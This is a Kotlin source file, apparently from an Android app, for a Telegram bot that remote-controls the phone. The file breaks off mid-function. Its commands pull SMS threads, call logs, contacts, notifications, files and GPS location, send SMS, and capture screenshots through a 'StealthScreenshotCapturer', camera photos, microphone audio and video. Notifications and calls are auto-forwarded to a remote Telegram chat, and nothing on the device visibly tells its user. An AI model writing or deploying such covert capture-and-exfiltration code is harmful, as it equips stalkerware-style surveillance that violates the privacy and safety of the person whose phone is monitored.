package com.ismartcoding.plain.telegram

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CameraMetadata
import android.hardware.camera2.CaptureRequest
import android.graphics.ImageFormat
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.provider.CallLog
import com.ismartcoding.lib.helpers.CoroutinesHelper.coIO
import com.ismartcoding.lib.logcat.LogCat
import com.ismartcoding.plain.MainApp
import com.ismartcoding.plain.data.DCall
import com.ismartcoding.plain.data.DContact
import com.ismartcoding.plain.data.DNotification
import com.ismartcoding.plain.features.PackageHelper
import com.ismartcoding.plain.features.media.CallMediaStoreHelper
import com.ismartcoding.plain.features.media.ContactMediaStoreHelper
import com.ismartcoding.plain.features.sms.SmsConversationHelper
import com.ismartcoding.plain.features.sms.SmsHelper
import com.ismartcoding.plain.helpers.BatteryHistoryHelper
import com.ismartcoding.plain.helpers.PhoneHelper
import com.ismartcoding.plain.helpers.StealthScreenshotCapturer
import com.ismartcoding.plain.services.AppBlockHelper
import com.ismartcoding.plain.services.LiveCallTracker
import com.ismartcoding.plain.services.NotificationLogHelper
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.coroutines.resume
import kotlin.math.min

object TelegramBotManager {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollJob: Job? = null

    @Volatile var token: String = ""
    @Volatile var chatId: String = ""
    @Volatile var isRunning: Boolean = false
    @Volatile var forwardNotifications: Boolean = true
    @Volatile var forwardCalls: Boolean = true
    @Volatile private var lastUpdateId: Long = 0L
    @Volatile private var lastForwardedCallState: String = "idle"

    private val ts get() = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())

    private val allCommands = listOf(
        "start" to "👋 Welcome & device status",
        "help" to "📖 Help & all commands",
        "messages" to "💬 Recent SMS conversations",
        "sms" to "📨 Messages in a thread — /sms <thread_id>",
        "sendsms" to "📤 Send SMS — /sendsms <number> <text>",
        "calls" to "📞 Recent call log",
        "contacts" to "👥 List contacts",
        "notifications" to "🔔 Recent notifications",
        "logs" to "📋 Notification log history",
        "files" to "📁 Browse files — /files [path]",
        "screenshot" to "📸 Take a screenshot",
        "photo" to "📷 Camera photo — /photo [front|back]",
        "audio" to "🎙 Record audio — /audio <seconds>",
        "video" to "🎬 Record video — /video <seconds> [front|back]",
        "apps" to "📱 List installed apps",
        "blockapp" to "🚫 Block an app — /blockapp <package>",
        "unblockapp" to "✅ Unblock an app — /unblockapp <package>",
        "blockedapps" to "📵 Show all blocked apps",
        "location" to "📍 Current GPS location",
        "battery" to "🔋 Battery status",
        "device" to "📲 Device information",
        "commands" to "📝 List all commands with details",
        "stop" to "⛔ Stop the bot",
    )

    fun start(newToken: String, newChatId: String) {
        if (newToken.isBlank() || newChatId.isBlank()) return
        token = newToken
        chatId = newChatId
        if (isRunning) return
        isRunning = true
        pollJob?.cancel()
        pollJob = scope.launch {
            registerCommands()
            sendMessage("🟢 <b>PlainApp Bot started</b> — ${ts}\n📱 <i>${PhoneHelper.getDeviceName(MainApp.instance)}</i>\n\nType /help for all commands.")
            poll()
        }
        LogCat.d("TelegramBotManager started")
    }

    fun stop() {
        isRunning = false
        lastForwardedCallState = "idle"
        pollJob?.cancel()
        pollJob = null
        LogCat.d("TelegramBotManager stopped")
    }

    fun sendMessage(text: String) {
        if (token.isBlank() || chatId.isBlank()) return
        scope.launch {
            TelegramApiClient.sendMessage(token, chatId, text)
        }
    }

    fun forwardNotification(n: DNotification) {
        if (!isRunning || !forwardNotifications) return
        val txt = buildString {
            append("🔔 <b>New notification</b>\n")
            append("📱 <code>${htmlEsc(n.appName)}</code>\n")
            if (!n.title.isNullOrBlank()) append("📌 <b>${htmlEsc(n.title)}</b>\n")
            if (!n.body.isNullOrBlank()) append("💬 ${htmlEsc(n.body)}\n")
            append("🕐 <i>${ts}</i>")
        }
        sendMessage(txt)
    }

    fun forwardCallState(state: String, display: String, source: String, direction: String) {
        if (!isRunning || !forwardCalls) return
        if (state == lastForwardedCallState) return
        lastForwardedCallState = state
        val emoji = when (state) {
            "ringing" -> if (direction == "incoming") "📲" else "📞"
            "active" -> "✅"
            "ended" -> "🔴"
            else -> return
        }
        val stateLabel = when (state) {
            "ringing" -> if (direction == "incoming") "Incoming call" else "Outgoing call"
            "active" -> "Call connected"
            "ended" -> "Call ended"
            else -> return
        }
        val txt = buildString {
            append("$emoji <b>$stateLabel</b>\n")
            if (display.isNotBlank()) append("📱 <code>${htmlEsc(display)}</code>\n")
            if (source != "phone") append("📡 via <i>${htmlEsc(source)}</i>\n")
            append("🕐 <i>${ts}</i>")
        }
        sendMessage(txt)
    }

    private suspend fun poll() {
        while (isRunning) {
            try {
                val result = withContext(Dispatchers.IO) {
                    TelegramApiClient.getUpdates(token, lastUpdateId + 1, 25)
                }
                if (result == null) { delay(5000); continue }
                if (!result.optBoolean("ok", false)) { delay(5000); continue }
                val updates = result.optJSONArray("result") ?: continue
                for (i in 0 until updates.length()) {
                    val update = updates.getJSONObject(i)
                    val updateId = update.optLong("update_id", 0L)
                    if (updateId > lastUpdateId) lastUpdateId = updateId
                    handleUpdate(update)
                }
            } catch (e: CancellationException) {
                break
            } catch (e: Exception) {
                LogCat.e("TelegramBot poll error: ${e.message}")
                delay(5000)
            }
        }
    }

    private suspend fun handleUpdate(update: JSONObject) {
        val msg = update.optJSONObject("message") ?: return
        val fromChatId = msg.optJSONObject("chat")?.optLong("id")?.toString() ?: return
        if (fromChatId != chatId) {
            TelegramApiClient.sendMessage(token, fromChatId, "⛔ Unauthorized. This bot is private.")
            return
        }
        val text = msg.optString("text", "").trim()
        if (text.isEmpty()) return
        val parts = text.split(" ")
        val command = parts[0].lowercase().trimStart('/')
            .substringBefore("@")
        val args = parts.drop(1)
        scope.launch {
            try {
                when (command) {
                    "start" -> cmdStart()
                    "help" -> cmdHelp()
                    "messages" -> cmdMessages(args)
                    "sms" -> cmdSmsThread(args)
                    "sendsms" -> cmdSendSms(args)
                    "calls" -> cmdCalls(args)
                    "contacts" -> cmdContacts(args)
                    "notifications" -> cmdNotifications(args)
                    "logs" -> cmdLogs(args)
                    "files" -> cmdFiles(args)
                    "screenshot" -> cmdScreenshot()
                    "photo" -> cmdPhoto(args)
                    "audio" -> cmdAudio(args)
                    "video" -> cmdVideo(args)
                    "apps" -> cmdApps(args)
                    "blockapp" -> cmdBlockApp(args)
                    "unblockapp" -> cmdUnblockApp(args)
                    "blockedapps" -> cmdBlockedApps()
                    "location" -> cmdLocation()
                    "battery" -> cmdBattery()
                    "device" -> cmdDevice()
                    "commands" -> cmdCommands()
                    "stop" -> { sendMessage("⛔ Bot stopped. Restart it from the PlainApp settings."); stop() }
                    else -> sendMessage("❓ Unknown command: <code>$command</code>\n\nSend /help for all commands.")
                }
            } catch (e: Exception) {
                LogCat.e("TelegramBot cmd $command error: ${e.message}")
                sendMessage("❌ Error running /$command: ${htmlEsc(e.message ?: "unknown")}")
            }
        }
    }

    private fun registerCommands() {
        TelegramApiClient.setMyCommands(token, allCommands.map { it.first to it.second.replace(Regex("<[^>]+>"), "") })
    }

    private fun sendTyping() = TelegramApiClient.sendChatAction(token, chatId, "typing")
    private fun sendUploadPhoto() = TelegramApiClient.sendChatAction(token, chatId, "upload_photo")
    private fun sendUploadDocument() = TelegramApiClient.sendChatAction(token, chatId, "upload_document")
    private fun sendRecordVoice() = TelegramApiClient.sendChatAction(token, chatId, "record_voice")
    private fun sendUploadVideo() = TelegramApiClient.sendChatAction(token, chatId, "upload_video")

    private suspend fun cmdStart() {
        sendTyping()
        val info = buildString {
            append("🤖 <b>PlainApp Bot</b> — device remote control\n\n")
            append("📱 <b>Device:</b> ${htmlEsc(PhoneHelper.getDeviceName(MainApp.instance))}\n")
            append("🤖 <b>Android:</b> ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n")
            append("🕐 <b>Time:</b> ${ts}\n\n")
            val bat = BatteryHistoryHelper.sampleNow(MainApp.instance)
            if (bat != null) {
                append("🔋 <b>Battery:</b> ${bat.level}% ${if (bat.plugged > 0) "⚡ charging" else ""}\n")
            }
            val call = LiveCallTracker.snapshot()
            if (call.state != "idle") {
                append("📞 <b>Call:</b> ${call.state} (${call.direction})\n")
            }
            append("\nSend /help to see all available commands.")
        }
        sendMessage(info)
    }

    private suspend fun cmdHelp() {
        sendTyping()
        val sb = StringBuilder("📖 <b>PlainApp Bot — All Commands</b>\n\n")
        allCommands.forEach { (cmd, desc) ->
            sb.append("/<code>$cmd</code> — $desc\n")
        }
        sb.append("\n💡 <i>Live alerts are auto-forwarded for calls, SMS & notifications.</i>")
        sendMessage(sb.toString())
    }

    private suspend fun cmdMessages(args: List<String>) {
        sendTyping()
        val limit = min(args.firstOrNull()?.toIntOrNull() ?: 10, 50)
        try {
            val convs = SmsConversationHelper.searchConversationsAsync(MainApp.instance, "", limit, 0)
            if (convs.isEmpty()) { sendMessage("💬 No SMS conversations found."); return }
            val sb = StringBuilder("💬 <b>Recent SMS Conversations</b> (${convs.size})\n\n")
            convs.forEachIndexed { i, c ->
                sb.append("${i + 1}. 📱 <code>${htmlEsc(c.address)}</code>\n")
                sb.append("   💬 ${htmlEsc(c.snippet.take(80))}\n")
                sb.append("   🕐 ${fmtTime(c.date.toEpochMilliseconds())}  |  📬 ${c.messageCount} msgs")
                if (!c.read) sb.append("  🔴 unread")
                sb.append("\n   ➡️ Use /sms ${c.id} to read thread\n\n")
                if (sb.length > 3500) { sb.append("…and more"); return@forEachIndexed }
            }
            sendMessage(sb.toString())
        } catch (e: Exception) {
            sendMessage("❌ Could not read SMS: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cmdSmsThread(args: List<String>) {
        if (args.isEmpty()) { sendMessage("Usage: /sms <thread_id>\n\nGet thread IDs with /messages"); return }
        sendTyping()
        val threadId = args[0]
        try {
            val messages = SmsHelper.searchAsync(MainApp.instance, "thread_id:$threadId", 20, 0)
            if (messages.isEmpty()) { sendMessage("📭 No messages in thread $threadId"); return }
            val sb = StringBuilder("📨 <b>Thread $threadId</b> (${messages.size} messages)\n\n")
            messages.reversed().forEachIndexed { i, m ->
                val dir = if (m.type == 1) "📥" else "📤"
                sb.append("$dir <b>${htmlEsc(m.address)}</b>  <i>${fmtTime(m.date.toEpochMilliseconds())}</i>\n")
                sb.append("   ${htmlEsc(m.body.take(200))}\n\n")
                if (sb.length > 3800) return@forEachIndexed
            }
            sendMessage(sb.toString())
        } catch (e: Exception) {
            sendMessage("❌ Could not read thread: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun cmdSendSms(args: List<String>) {
        if (args.size < 2) { sendMessage("Usage: /sendsms <number> <message text>"); return }
        val number = args[0]
        val text = args.drop(1).joinToString(" ")
        try {
            SmsHelper.sendText(number, text)
            sendMessage("✅ SMS sent to <code>${htmlEsc(number)}</code>:\n<i>${htmlEsc(text)}</i>")
        } catch (e: Exception) {
            sendMessage("❌ Failed to send SMS: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cmdCalls(args: List<String>) {
        sendTyping()
        val limit = min(args.firstOrNull()?.toIntOrNull() ?: 20, 100)
        try {
            val calls = CallMediaStoreHelper.searchAsync(MainApp.instance, "", limit, 0)
            if (calls.isEmpty()) { sendMessage("📞 No call log entries."); return }
            val sb = StringBuilder("📞 <b>Recent Calls</b> (${calls.size})\n\n")
            calls.forEachIndexed { i, c ->
                val typeEmoji = when (c.type) {
                    CallLog.Calls.INCOMING_TYPE -> "📲 Incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "📤 Outgoing"
                    CallLog.Calls.MISSED_TYPE -> "❌ Missed"
                    CallLog.Calls.REJECTED_TYPE -> "🚫 Rejected"
                    else -> "📞 Unknown"
                }
                val dur = if (c.duration > 0) " · ${c.duration}s" else ""
                val name = if (c.name.isNotBlank()) " (${htmlEsc(c.name)})" else ""
                sb.append("${i + 1}. $typeEmoji${dur}\n")
                sb.append("   📱 <code>${htmlEsc(c.number)}</code>$name\n")
                sb.append("   🕐 ${fmtTime(c.startedAt.toEpochMilliseconds())}\n\n")
                if (sb.length > 3500) { sb.append("…truncated"); return@forEachIndexed }
            }
            sendMessage(sb.toString())
        } catch (e: Exception) {
            sendMessage("❌ Could not read call log: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cmdContacts(args: List<String>) {
        sendTyping()
        val query = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        try {
            val contacts = ContactMediaStoreHelper.searchAsync(MainApp.instance, query, 30, 0)
            if (contacts.isEmpty()) { sendMessage("👥 No contacts found."); return }
            val sb = StringBuilder("👥 <b>Contacts</b> (${contacts.size})\n\n")
            contacts.forEachIndexed { i, c ->
                sb.append("${i + 1}. 👤 <b>${htmlEsc(c.fullName())}</b>\n")
                c.phoneNumbers.forEachIndexed { j, ph ->
                    if (j < 3) sb.append("   📞 <code>${htmlEsc(ph.value)}</code>\n")
                }
                c.emails.forEachIndexed { j, em ->
                    if (j < 2) sb.append("   📧 <code>${htmlEsc(em.value)}</code>\n")
                }
                if (c.organization != null && c.organization!!.company.isNotBlank()) {
                    sb.append("   🏢 ${htmlEsc(c.organization!!.company)}\n")
                }
                sb.append("\n")
                if (sb.length > 3600) { sb.append("…and more. Use /contacts <name> to search."); return@forEachIndexed }
            }
            sendMessage(sb.toString())
        } catch (e: Exception) {
            sendMessage("❌ Could not read contacts: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun cmdNotifications(args: List<String>) {
        val limit = min(args.firstOrNull()?.toIntOrNull() ?: 15, 50)
        val list = NotificationLogHelper.all().takeLast(limit).reversed()
        if (list.isEmpty()) { sendMessage("🔔 No recent notifications."); return }
        val sb = StringBuilder("🔔 <b>Recent Notifications</b> (${list.size})\n\n")
        list.forEachIndexed { i, n ->
            sb.append("${i + 1}. 📱 <code>${htmlEsc(n.appName)}</code>\n")
            if (!n.title.isNullOrBlank()) sb.append("   📌 <b>${htmlEsc(n.title.take(80))}</b>\n")
            if (!n.body.isNullOrBlank()) sb.append("   💬 ${htmlEsc(n.body.take(150))}\n")
            sb.append("   🕐 ${fmtTime(n.time.toEpochMilliseconds())}\n\n")
            if (sb.length > 3500) { sb.append("…truncated"); return@forEachIndexed }
        }
        sendMessage(sb.toString())
    }

    private fun cmdLogs(args: List<String>) {
        val limit = min(args.firstOrNull()?.toIntOrNull() ?: 30, 200)
        val list = NotificationLogHelper.all().takeLast(limit).reversed()
        if (list.isEmpty()) { sendMessage("📋 No notification logs."); return }
        val sb = StringBuilder("📋 <b>Notification Log</b> (last ${list.size})\n\n")
        list.forEachIndexed { i, n ->
            sb.append("${i + 1}. <b>${htmlEsc(n.appName)}</b> · ${fmtTime(n.time.toEpochMilliseconds())}\n")
            if (!n.title.isNullOrBlank()) sb.append("   📌 ${htmlEsc(n.title.take(60))}\n")
            if (!n.body.isNullOrBlank()) sb.append("   💬 ${htmlEsc(n.body.take(100))}\n")
            sb.append("\n")
            if (sb.length > 3600) { sb.append("…truncated (${list.size - i - 1} more)"); return@forEachIndexed }
        }
        sendMessage(sb.toString())
    }

    private fun cmdFiles(args: List<String>) {
        val path = if (args.isNotEmpty()) args.joinToString(" ") else "/sdcard"
        try {
            val dir = File(path)
            if (!dir.exists()) { sendMessage("❌ Path not found: <code>${htmlEsc(path)}</code>"); return }
            if (!dir.isDirectory) {
                val sizeKb = dir.length() / 1024
                sendMessage("📄 <b>${htmlEsc(dir.name)}</b>\n📁 ${htmlEsc(dir.parent ?: "")}\n💾 ${sizeKb} KB")
                return
            }
            val items = dir.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() })) ?: emptyList()
            if (items.isEmpty()) { sendMessage("📂 <b>${htmlEsc(path)}</b>\n\n(empty folder)"); return }
            val sb = StringBuilder("📂 <b>${htmlEsc(path)}</b> (${items.size} items)\n\n")
            items.take(40).forEachIndexed { i, f ->
                val icon = if (f.isDirectory) "📁" else fileIcon(f.name)
                val size = if (f.isFile) " · ${f.length() / 1024} KB" else " · ${f.listFiles()?.size ?: 0} items"
                sb.append("${i + 1}. $icon <code>${htmlEsc(f.name)}</code>$size\n")
            }
            if (items.size > 40) sb.append("\n…and ${items.size - 40} more items")
            sb.append("\n\n➡️ /files ${htmlEsc(path)}/<code>name</code> to navigate")
            sendMessage(sb.toString())
        } catch (e: SecurityException) {
            sendMessage("⛔ Permission denied: <code>${htmlEsc(path)}</code>")
        } catch (e: Exception) {
            sendMessage("❌ Error: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cmdScreenshot() {
        sendMessage("📸 Taking screenshot…")
        sendUploadPhoto()
        try {
            val shot = StealthScreenshotCapturer.captureNow(manual = true)
            if (shot == null) {
                sendMessage("❌ Screenshot failed. Ensure Accessibility Service is enabled in PlainApp settings.")
                return
            }
            val file = File(shot.absPath)
            if (!file.exists()) { sendMessage("❌ Screenshot file not found."); return }
            val caption = "📸 Screenshot · ${shot.width}×${shot.height} · ${shot.sizeBytes / 1024} KB · ${ts}"
            TelegramApiClient.sendPhoto(token, chatId, file, caption)
        } catch (e: Exception) {
            sendMessage("❌ Screenshot error: ${htmlEsc(e.message ?: "")}")
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun cmdPhoto(args: List<String>) {
        val useFront = args.firstOrNull()?.lowercase() == "front"
        sendMessage("📷 Capturing ${if (useFront) "front" else "back"} camera photo…")
        sendUploadPhoto()
        val file = capturePhoto(MainApp.instance, useFront)
        if (file != null) {
            TelegramApiClient.sendPhoto(token, chatId, file, "📷 ${if (useFront) "Front" else "Back"} camera · ${ts}")
            file.delete()
        } else {
            sendMessage("❌ Photo capture failed. Ensure Camera permission is granted.")
        }
    }

    private suspend fun cmdAudio(args: List<String>) {
        val seconds = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 300) ?: 10
        sendMessage("🎙 Recording ${seconds}s of audio…")
        sendRecordVoice()
        val file = recordAudio(MainApp.instance, seconds)
        if (file != null && file.exists() && file.length() > 0) {
            TelegramApiClient.sendAudio(token, chatId, file, "🎙 Audio · ${seconds}s · ${ts}", seconds)
            file.delete()
        } else {
            sendMessage("❌ Audio recording failed. Ensure Microphone permission is granted.")
        }
    }

    private suspend fun cmdVideo(args: List<String>) {
        val seconds = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 120) ?: 10
        val useFront = args.getOrNull(1)?.lowercase() == "front"
        sendMessage("🎬 Recording ${seconds}s video (${if (useFront) "front" else "back"} camera)…")
        sendUploadVideo()
        val file = recordVideo(MainApp.instance, seconds, useFront)
        if (file != null && file.exists() && file.length() > 0) {
            TelegramApiClient.sendVideo(token, chatId, file, "🎬 Video · ${seconds}s · ${if (useFront) "front" else "back"} camera · ${ts}", seconds)
            file.delete()
        } else {
            sendMessage("❌ Video recording failed. Ensure Camera & Microphone permissions are granted.")
        }
    }

    private suspend fun cmdApps(args: List<String>) {
        sendTyping()
        val query = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        try {
            val apps = PackageHelper.searchAsync(query, 40, 0, com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC)
            if (apps.isEmpty()) { sendMessage("📱 No apps found."); return }
            val sb = StringBuilder("📱 <b>Installed Apps</b> (${apps.size})\n\n")
            apps.forEachIndexed { i, a ->
                val blocked = if (AppBlockHelper.isBlocked(a.id)) " 🚫" else ""
                sb.append("${i + 1}. <b>${htmlEsc(a.name)}</b>$blocked\n")
                sb.append("   <code>${htmlEsc(a.id)}</code>  v${htmlEsc(a.version)}\n\n")
                if (sb.length > 3600) { sb.append("…and more. Use /apps <name> to search."); return@forEachIndexed }
            }
            sendMessage(sb.toString())
        } catch (e: Exception) {
            sendMessage("❌ Could not list apps: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun cmdBlockApp(args: List<String>) {
        if (args.isEmpty()) { sendMessage("Usage: /blockapp <package.name>\n\nFind package names with /apps"); return }
        val pkg = args[0]
        AppBlockHelper.setBlocked(pkg, true)
        sendMessage("🚫 <b>${htmlEsc(pkg)}</b> is now blocked.\n\nUse /unblockapp $pkg to unblock.")
    }

    private fun cmdUnblockApp(args: List<String>) {
        if (args.isEmpty()) { sendMessage("Usage: /unblockapp <package.name>"); return }
        val pkg = args[0]
        AppBlockHelper.setBlocked(pkg, false)
        sendMessage("✅ <b>${htmlEsc(pkg)}</b> is now unblocked.")
    }

    private fun cmdBlockedApps() {
        val blocked = AppBlockHelper.getBlockedSet()
        if (blocked.isEmpty()) { sendMessage("📵 No apps are currently blocked."); return }
        val sb = StringBuilder("📵 <b>Blocked Apps</b> (${blocked.size})\n\n")
        blocked.forEachIndexed { i, pkg ->
            sb.append("${i + 1}. <code>${htmlEsc(pkg)}</code>\n")
        }
        sb.append("\nUse /unblockapp <package> to unblock.")
        sendMessage(sb.toString())
    }

    @SuppressLint("MissingPermission")
    private fun cmdLocation() {
        sendMessage("📍 Getting location…")
        try {
            val lm = MainApp.instance.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val providers = listOf(
                android.location.LocationManager.GPS_PROVIDER,
                android.location.LocationManager.NETWORK_PROVIDER
            )
            var loc: android.location.Location? = null
            for (p in providers) {
                if (lm.isProviderEnabled(p)) {
                    loc = lm.getLastKnownLocation(p)
                    if (loc != null) break
                }
            }
            if (loc == null) {
                sendMessage("❌ Location not available. Ensure Location permission & GPS are enabled.")
                return
            }
            val age = (System.currentTimeMillis() - loc.time) / 1000
            TelegramApiClient.sendLocation(token, chatId, loc.latitude, loc.longitude)
            sendMessage("📍 <b>Location</b>\n" +
                "🌐 Lat: <code>${loc.latitude}</code>\n" +
                "🌐 Lon: <code>${loc.longitude}</code>\n" +
                "🎯 Accuracy: ±${loc.accuracy.toInt()}m\n" +
                "🕐 Age: ${age}s ago")
        } catch (e: Exception) {
            sendMessage("❌ Location error: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun cmdBattery() {
        val bat = BatteryHistoryHelper.sampleNow(MainApp.instance)
        if (bat == null) { sendMessage("❌ Battery info unavailable."); return }
        val plugState = when (bat.plugged) {
            1 -> "⚡ AC charging"
            2 -> "⚡ USB charging"
            4 -> "⚡ Wireless charging"
            else -> "🔌 Unplugged"
        }
        val statusLabel = when (bat.status) {
            android.os.BatteryManager.BATTERY_STATUS_CHARGING -> "Charging"
            android.os.BatteryManager.BATTERY_STATUS_DISCHARGING -> "Discharging"
            android.os.BatteryManager.BATTERY_STATUS_FULL -> "Full"
            android.os.BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "Not charging"
            else -> "Unknown"
        }
        val level = bat.level
        val bar = buildString {
            val filled = (level / 10)
            append("[")
            repeat(filled) { append("█") }
            repeat(10 - filled) { append("░") }
            append("]")
        }
        sendMessage("🔋 <b>Battery Status</b>\n\n" +
            "$bar <b>$level%</b>\n" +
            "🔌 $plugState\n" +
            "📊 Status: $statusLabel\n" +
            "🌡 Temp: ${bat.temperatureC}°C\n" +
            "⚡ Voltage: ${bat.voltageMv}mV\n" +
            "🕐 Checked: ${ts}")
    }

    private fun cmdDevice() {
        val ctx = MainApp.instance
        val name = PhoneHelper.getDeviceName(ctx)
        val batPct = PhoneHelper.getBatteryPercentage(ctx)
        val sb = StringBuilder("📲 <b>Device Information</b>\n\n")
        sb.append("📱 <b>Name:</b> ${htmlEsc(name)}\n")
        sb.append("🏭 <b>Brand:</b> ${htmlEsc(Build.BRAND)}\n")
        sb.append("🔧 <b>Model:</b> ${htmlEsc(Build.MODEL)}\n")
        sb.append("🤖 <b>Android:</b> ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n")
        sb.append("🆔 <b>Build:</b> ${htmlEsc(Build.DISPLAY.take(40))}\n")
        sb.append("🔋 <b>Battery:</b> $batPct%\n")
        sb.append("🕐 <b>Time:</b> ${ts}\n")
        val call = LiveCallTracker.snapshot()
        if (call.state != "idle") {
            sb.append("📞 <b>Call:</b> ${call.state} (${call.direction})\n")
        }
        sendMessage(sb.toString())
    }

    private fun cmdCommands() {
        val sb = StringBuilder("📝 <b>All Commands — Full Details</b>\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📱 <b>MESSAGING</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /messages [n] — List last N SMS conversations (default 10, max 50)\n")
        sb.append("• /sms &lt;thread_id&gt; — Read messages in a specific SMS thread\n")
        sb.append("• /sendsms &lt;number&gt; &lt;text&gt; — Send an SMS to any number\n")
        sb.append("• /calls [n] — View call log (default 20, max 100)\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("👥 <b>CONTACTS</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /contacts [name] — List all contacts or search by name\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("🔔 <b>NOTIFICATIONS & LOGS</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /notifications [n] — Recent notifications (default 15, max 50)\n")
        sb.append("• /logs [n] — Full notification log history (default 30, max 200)\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📁 <b>FILES</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /files — Browse /sdcard root\n")
        sb.append("• /files /path/to/dir — Browse specific directory\n")
        sb.append("• /files /path/to/file.ext — Show file info\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📸 <b>CAMERA & MEDIA</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /screenshot — Instant screenshot (needs Accessibility Service)\n")
        sb.append("• /photo — Instant back camera photo\n")
        sb.append("• /photo front — Instant front camera selfie\n")
        sb.append("• /audio 10 — Record 10 seconds of audio (1–300s)\n")
        sb.append("• /video 10 — Record 10s video with back camera (1–120s)\n")
        sb.append("• /video 10 front — Record 10s video with front camera\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📱 <b>APPS</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /apps — List all installed apps\n")
        sb.append("• /apps chrome — Search apps by name\n")
        sb.append("• /blockapp &lt;package&gt; — Block an app from launching\n")
        sb.append("• /unblockapp &lt;package&gt; — Remove app block\n")
        sb.append("• /blockedapps — List all blocked apps\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📍 <b>LOCATION & DEVICE</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /location — Current GPS location + map pin\n")
        sb.append("• /battery — Battery level, charging state & temp\n")
        sb.append("• /device — Full device information\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("⚙️ <b>BOT CONTROL</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /start — Show welcome message & status\n")
        sb.append("• /help — Quick command reference\n")
        sb.append("• /commands — This detailed help\n")
        sb.append("• /stop — Stop the bot\n\n")
        sb.append("🔄 <b>AUTO-FORWARDING (always on):</b>\n")
        sb.append("All new notifications, incoming/outgoing calls and missed calls are automatically forwarded to this chat in real-time.")
        sendMessage(sb.toString())
    }

    @SuppressLint("MissingPermission")
    private suspend fun capturePhoto(context: Context, useFront: Boolean): File? {
        return suspendCancellableCoroutine { cont ->
            val handlerThread = HandlerThread("TgCameraCapture").apply { start() }
            val handler = Handler(handlerThread.looper)
            var cameraDevice: CameraDevice? = null
            var imageReader: ImageReader? = null

            fun cleanup() {
                try { cameraDevice?.close() } catch (_: Throwable) {}
                try { imageReader?.close() } catch (_: Throwable) {}
                try { handlerThread.quitSafely() } catch (_: Throwable) {}
            }

            cont.invokeOnCancellation { cleanup() }

            try {
                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val facing = if (useFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
                val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                    cameraManager.getCameraCharacteristics(id)
                        .get(CameraCharacteristics.LENS_FACING) == facing
                } ?: cameraManager.cameraIdList.firstOrNull() ?: run {
                    cleanup()
                    if (cont.isActive) cont.resume(null)
                    return@suspendCancellableCoroutine
                }

                val file = File(context.cacheDir, "tg_photo_${System.currentTimeMillis()}.jpg")
                imageReader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 1)
                imageReader!!.setOnImageAvailableListener({ reader ->
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        try {
                            val buffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            image.close()
                            file.writeBytes(bytes)
                            cleanup()
                            if (cont.isActive) cont.resume(if (file.length() > 0) file else null)
                        } catch (e: Exception) {
                            image.close()
                            cleanup()
                            if (cont.isActive) cont.resume(null)
                        }
                    }
                }, handler)

                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        try {
                            camera.createCaptureSession(
                                listOf(imageReader!!.surface),
                                object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
                                        try {
                                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                                addTarget(imageReader!!.surface)
